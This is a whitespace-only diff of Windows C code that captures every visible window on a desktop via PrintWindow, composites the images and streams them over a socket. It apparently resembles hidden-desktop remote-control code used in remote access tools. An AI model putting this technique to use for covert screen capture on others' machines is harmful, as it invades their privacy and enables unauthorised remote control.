@@ -101,7 +101,7 @@ int main(){
         while(curw != NULL){
             if(IsWindowVisible(curw))
                 SetWindowLongA(curw, GWL_EXSTYLE, GetWindowLongA(curw, GWL_EXSTYLE) | WS_EX_COMPOSITED);
-	        curw = GetWindow(curw, GW_HWNDPREV);
+            curw = GetWindow(curw, GW_HWNDPREV);
         }
         Sleep(50);
         curw = ocurw;
@@ -110,14 +110,14 @@ int main(){
             if(!IsWindowVisible(curw)) goto next;
             RECT wRect;
             GetWindowRect(curw, &wRect);
-	        HDC wdc = CreateCompatibleDC(hdc);
-	        HBITMAP wbitmap = CreateCompatibleBitmap(hdc, rect.right - rect.left, rect.bottom - rect.top);
-	        SelectObject(wdc, wbitmap);
-	        if (PrintWindow(curw, wdc, 0))
-		        BitBlt(memdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, wdc, 0, 0, SRCCOPY);
+            HDC wdc = CreateCompatibleDC(hdc);
+            HBITMAP wbitmap = CreateCompatibleBitmap(hdc, rect.right - rect.left, rect.bottom - rect.top);
+            SelectObject(wdc, wbitmap);
+            if (PrintWindow(curw, wdc, 0))
+                BitBlt(memdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, wdc, 0, 0, SRCCOPY);
             SetWindowLongA(curw, GWL_EXSTYLE, GetWindowLongA(curw, GWL_EXSTYLE) ^ WS_EX_COMPOSITED);
-	        DeleteObject(wbitmap);
-	        DeleteDC(wdc);
+            DeleteObject(wbitmap);
+            DeleteDC(wdc);
         next:
             curw = GetWindow(curw, GW_HWNDPREV);
         }
@@ -161,14 +161,14 @@ int main(){
         SelectObject(hNew, hBmp);
         BitBlt(hNew, 0, 0, right - left, bot - top, memdc, left, top, SRCCOPY);
         DeleteObject(hbitmap);
-	    DeleteDC(memdc);
+        DeleteDC(memdc);
         pastbm = bitmap;
-	    int sz = 0;
+        int sz = 0;
         //convert to png, ik it says jpg, just deal with it
-	    char* jpg = bmptojpg(hBmp, &sz);
-	    DeleteObject(hBmp);
-	    DeleteDC(hNew);
-	    if(sock_send(jpg, sz, left, top)) break;
+        char* jpg = bmptojpg(hBmp, &sz);
+        DeleteObject(hBmp);
+        DeleteDC(hNew);
+        if(sock_send(jpg, sz, left, top)) break;
     }
     free(bitmap);
     CloseDesktop(dsk);
